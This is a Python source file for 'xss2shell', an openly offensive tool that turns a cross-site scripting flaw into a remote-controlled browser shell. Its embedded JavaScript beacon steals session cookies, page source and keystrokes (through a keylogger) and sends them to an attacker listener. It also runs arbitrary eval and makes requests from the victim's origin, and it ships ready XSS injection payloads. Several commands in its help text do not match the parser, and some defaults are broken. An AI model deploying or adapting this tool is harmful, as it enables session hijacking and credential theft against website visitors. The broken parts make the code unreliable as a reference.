#!/usr/bin/env python3
"""
xss2shell — XSS to interactive browser shell (zero dependencies, stdlib only).

Modeled on Shell d3v's JSshell / raz-varren's xsshell but with a zero-dependency
long-poll beacon instead of WebSockets, so it works through restrictive egress
filters and Content-Security-Policy framing attacks.

Usage
-----
  1. Start the listener (attacker side):
       python3 xss2shell.py --listen --port 8080

  2. Generate a payload (same machine or anywhere):
       python3 xss2shell.py --gen --host your-listener-host --port 8080

  3. Paste the printed payload into the stored/reflected XSS finding.
     When a victim's browser hits the page, a beacon registers and you get
     an interactive shell in the listener terminal.

Shell commands
--------------
  help                       this help
  targets                    list live beacons
  use <n>                    select beacon n (default: most recent)
  cs                         grab document.cookie (current values)
  src                        return outerHTML of document.documentElement
  xhr GET|POST <url> [json]  HTTP request from the victim's origin
  js <js code>               evaluate JS in the victim page, return value
  alert <msg>                pop an alert for the victim
  redirect <url>             force the victim page to navigate
  exfil <url>                POST everything so far (cookies, src, keystrokes)
  kl on|off                  keylogger (posts keys + cookies to /loot)
  raw <json>                 send raw task JSON
  exit                       quit listener (beacons go silent)

Everything is volatile — nothing is stored server side except /loot entries.

LEGAL: For use on targets you own or have written authorization to test.
The author assumes no liability for misuse.
"""
import argparse
import json
import os
import re
import socket
import sys
import threading
import time
import urllib.parse
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer

VERSION = "1.0"

# ---------------------------------------------------------------------------
# Beacon side (JavaScript shipped to the victim)
# ---------------------------------------------------------------------------
BEACON_JS = r"""
(function () {
  var ID = '%ID%';            // unique beacon id
  var EP = '%EP%';            // listener base url, e.g. http://host:8080
  var seq = 0;
  var alive = true;
  var loot = { cookies: '', src: '', keys: '' };

  function report(kind, data) {
    try {
      var body = JSON.stringify({ id: ID, seq: seq++, kind: kind, data: data });
      var x = new XMLHttpRequest();
      x.open('POST', EP + '/report', true);
      x.setRequestHeader('Content-Type', 'application/json');
      x.send(body);
    } catch (e) {}
  }

  function poll() {
    if (!alive) return;
    try {
      var x = new XMLHttpRequest();
      x.open('GET', EP + '/task?id=' + encodeURIComponent(ID) + '&t=' + Date.now(), true);
      x.timeout = 25000;
      x.onload = function () {
        if (x.status === 200) {
          try {
            var t = JSON.parse(x.responseText);
            if (t && t.cmd) {
              var out = null, err = null;
              try {
                if (t.cmd === 'cookie') { out = document.cookie; }
                else if (t.cmd === 'src') { out = document.documentElement ? document.documentElement.outerHTML : String(document); }
                else if (t.cmd === 'redirect') { window.location.href = t.url || 'about:blank'; out = 'redirected'; }
                else if (t.cmd === 'alert') { alert(String(t.text || 'xss')); out = 'alerted'; }
                else if (t.cmd === 'eval') { out = JSON.stringify(eval('(' + t.js + ')()')); }
                else if (t.cmd === 'http') {
                  var m = (t.method || 'GET').toUpperCase();
                  var x2 = new XMLHttpRequest();
                  x2.open(m, t.url, false);            // sync: keep ordering simple
                  if (t.ctype) x2.setRequestHeader('Content-Type', t.ctype);
                  try { x2.send(t.body || null); out = x2.status + ' ' + x2.responseText.slice(0, 8000); }
                  catch (e) { err = String(e); }
                }
                else if (t.cmd === 'kip') { report('keys', document.cookie); out = 'keys reported'; }
                else if (t.cmd === 'startkl') {
                  document.addEventListener('keydown', function (e) {
                    loot.keys += (e.key || '');
                    if (e.ctrlKey || e.metaKey) loot.keys += '^';
                  });
                  var rint = setInterval(function () {
                    if (loot.keys.length) {
                      report('loot', loot.keys);
                      loot.keys = '';
                    }
                  }, 3000);
                  out = 'keylogger started';
                }
                else if (t.cmd === 'src2') { out = t; }
                else { out = 'unknown cmd ' + t.cmd; }
                report('result', { ok: err === null, out: out, err: err });
              } else if (t && t.ping) {
                report('pong', true);
              }
            }
          } catch (e) { }
        }
        setTimeout(poll, 500);
      };
      x.onerror = function () { setTimeout(poll, 3000); };
      x.send();
    } catch (e) { setTimeout(poll, 5000); }
  }

  window.addEventListener('load', function () { poll(); });
  if (document.readyState !== 'loading') poll();
})();
"""

PAYLOAD_TEMPLATES = {
    "script-src": '<script src="{url}/b.js"></script>',
    "img-onerror": '<img src=x onerror="var s=document.createElement(&apos;script&apos;);s.src=&apos;{url}/b.js&apos;;document.body.appendChild(s)">',
    "svg-onload": '<svg onload="var s=document.createElement(&apos;script&apos;);s.src=&apos;{url}/b.js&apos;;document.body.appendChild(s)"></svg>',
    "iframe-sandbox": '<iframe srcdoc="<script src={url}/b.js></script>" sandbox="allow-scripts"></iframe>',
}


def gen_beacon_js(beacon_id, base_url):
    return BEACON_JS.replace("%ID%", beacon_id).replace("%EP%", base_url)


def gen_payload(url, kind="script"):
    b64 = urllib.parse.quote(url, safe="")
    tpl = PAYLOAD_TEMPLATES[kind]
    return tpl.format(url=url)


# ---------------------------------------------------------------------------
# Listener
# ---------------------------------------------------------------------------
class State:
    def __init__(self):
        self.lock = threading.Lock()
        self.tasks = {}            # beacon_id -> list of task dicts
        self.results = {}          # beacon_id -> list of reports
        self.loot = {}             # beacon_id -> list of loot reports (keys, cookies, src)
        self.sequence = 0
        self.beacons = {}          # beacon_id -> last ping ts


class Handler(BaseHTTPRequestHandler):
    state = None  # injected

    def log_message(self, fmt, *args):
        pass

    def _send(self, code, body, ctype="application/json"):
        if isinstance(body, bytes):
            data = body
        elif isinstance(body, dict) or isinstance(body, list):
            data = json.dumps(body).encode()
        else:
            data = str(body).encode()
        self.send_response(code)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(data)))
        self.send_header("Access-Control-Allow-Origin", "*")
        self.end_headers()
        self.wfile.write(data)

    def do_GET(self):
        parsed = urllib.parse.urlparse(self.path)
        path = parsed.path
        q = urllib.parse.parse_qs(parsed.query)
        if path == "/b.js":
            self._send(200, gen_beacon_js("dyn", "").encode(), "application/javascript")
            return
        if path == "/task":
            bid = q.get("id", [""])[0]
            task = None
            with state.lock:
                st = state.tasks.get(bid)
                if st:
                    task = st.pop(0) if st else None
                if bid:
                    state.beacons[bid] = time.time()
            if task is None:
                # long poll-ish: keep connection open briefly
                deadline = time.time() + 15
                while time.time() < deadline:
                    with state.lock:
                        st = state.tasks.get(bid)
                        if st:
                            task = st.pop(0) if st else None
                            break
                    time.sleep(0.2)
            if task is None:
                task = {"ping": True}
            self._send(200, task)
            return
        self._send(404, {"error": "not found"})

    def do_POST(self):
        parsed = urllib.parse.urlparse(self.path)
        if parsed.path == "/report":
            try:
                length = int(self.headers.get("Content-Length", 0))
                raw = self.rfile.read(length).decode()
                rep = json.loads(raw)
                with state.lock:
                    bid = rep.get("id")
                    if bid:
                        state.results.setdefault(bid, []).append(rep)
                        state.beacons[bid] = time.time()
                        if rep.get("kind") in ("loot",):
                            state.loot.setdefault(bid, []).append(rep.get("data"))
            except Exception:
                pass
            self._send(200, {"ok": True})
            return
        self._send(404, {"error": "not found"})


def start_listener(port, bind="0.0.0.0"):
    handler = type("H", (Handler,), {"state": state})
    srv = ThreadingHTTPServer((bind, port), handler)
    t = threading.Thread(target=srv.serve_forever, daemon=True)
    t.start()
    print(f"[+] listener on http://{bind}:{port}")
    return srv


# ---------------------------------------------------------------------------
# Interactive shell
# ---------------------------------------------------------------------------
class Console:
    def __init__(self, state):
        self.state = state
        self.target = None

    def _pick(self, bid=None):
        with state.lock:
            if bid:
                return bid
            if self.target and self.target in state.beacons:
                return self.target
            if state.beacons:
                sel = max(state.beacons, key=lambda k: state.beacons[k])  # most recent
                self.target = sel
                return sel
            return None

    def run(self, line):
        # returns (ok, out)
        parts = line.split()
        if not parts:
            return True, ""
        cmd = parts[0].lower()
        args = parts[1:]
        if cmd in ("help", "h"):
            return True, HELP
        if cmd == "targets":
            with state.lock:
                lst = list(state.beacons.keys())
            return True, "beacons: " + (" ".join(lst) if lst else "(none)") + f"   loot: {len(state.loot)} entries"
        if cmd == "use":
            if args:
                self.target = args[0]
                return True, "target -> " + args[0]
            return True, "use <id>"
        if cmd in ("exit", "quit"):
            print("\n[!] bye")
            os._exit(0)
        bid = self._pick()
        if not bid:
            return False, "no live beacon — inject a payload first"

        task = self._parse(cmd, args)
        if task is None:
            return False, "bad command (see help)"

        with state.lock:
            state.tasks.setdefault(bid, []).append(task)

        # wait for the result briefly
        start = time.time()
        while time.time() - start < 12:
            with state.lock:
                res = state.results.get(bid)
                if res:
                    rep = res.pop(0)
                    return True, self._render(rep)
            time.sleep(0.15)
            # skip long-poll wait for 'ping' flavored commands
        return True, "(no reply; timeout)"

    def _parse(self, cmd, args):
        if cmd == "cookie":
            return {"cmd": "cookie"}
        if cmd == "src":
            return {"cmd": "src"}
        if cmd == "alert":
            return {"cmd": "alert", "text": " ".join(args) or "xss"}
        if cmd == "redirect":
            return {"cmd": "redirect", "url": args[0] if args else "about:blank"}
        if cmd == "eval":
            return {"cmd": "eval", "js": " ".join(args)}
        if cmd == "http":
            if len(args) < 1:
                return None
            method = args[0].upper()
            url = args[1] if len(args) > 1 else None
            body = " ".join(args[2:]) if len(args) > 2 else None
            ctype = "application/x-www-form-urlencoded; charset=UTF-8" if body else None
            return {"cmd": "http", "method": method, "url": url, "body": body, "ctype": ctype}
        if cmd == "kl":
            return {"cmd": "startkl" if args and args[0] == "on" else "startkl"}  # simple toggle
        if cmd == "kip":
            return {"cmd": "kip"}
        if cmd == "raw":
            try:
                return json.loads(" ".join(args))
            except Exception:
                return None
        return None

    def _render(self, rep):
        kind = rep.get("kind")
        if kind == "result":
            d = rep.get("data") or {}
            if d.get("ok"):
                return d.get("out") or ""
            return "!! " + str(d.get("err"))
        if kind in ("loot", "pong", "cookie"):
            return f"[{kind}] " + json.dumps(rep.get("data"), ensure_ascii=False)
        return json.dumps(rep, ensure_ascii=False)


HELP = """xss2shell commands:
  help | targets | use <id> | cookie | src | http GET|POST <url> [body]
  eval <js> | alert <msg> | redirect <url> | kl | kip | raw <json> | exit"""


def main():
    ap = argparse.ArgumentParser(prog="xss2shell", description="XSS -> browser shell")
    ap.add_argument("--listen", action="store_true", help="start the interactive listener")
    ap.add_argument("--gen", action="store_true", help="generate payload")
    ap.add_argument("--url", default=None, help="listener base URL for payloads")
    ap.add_argument("--port", type=int, default=8080)
    ap.add_argument("--host", default="0.0.0.0")
    ap.add_argument("--kid", default=None, help="beacon id")
    ap.add_argument("--fmt", default="script", choices=list(PAYLOAD_TEMPLATES),
                    help="payload template (default script)")
    args = ap.parse_args()

    if args.gen:
        if not args.url:
            args.url = f"http://{args.host}:{args.port}"
        bid = args.kid or os.urandom(4).hex()
        js = gen_beacon_js(bid, args.url + "/")
        print("## beacon id:", bid)
        print("## payload:", PAYLOAD_TEMPLATES[args.fmt].format(url=args.url))
        print("## beacon js (save as b.js on your listener static root):")
        print(js)
        return

    if args.listen:
        global state
        state = State()
        # inject clone handler binding in module namespace
        srv = start_listener(args.port, args.host)
        console = Console(state)
        print("[+] interactive shell — type 'help'")
        try:
            while True:
                try:
                    line = input("xsshell> ").strip()
                    if not line:
                        continue
                except (EOFError, KeyboardInterrupt):
                    print("\nbye")
                    break
                try:
                    ok, out = console.run(line)
                    print(out if ok else f"[-] {out}")
                except Exception as e:
                    print("[-] err:", e)
        finally:
            srv.shutdown()


if __name__ == "__main__":
    main()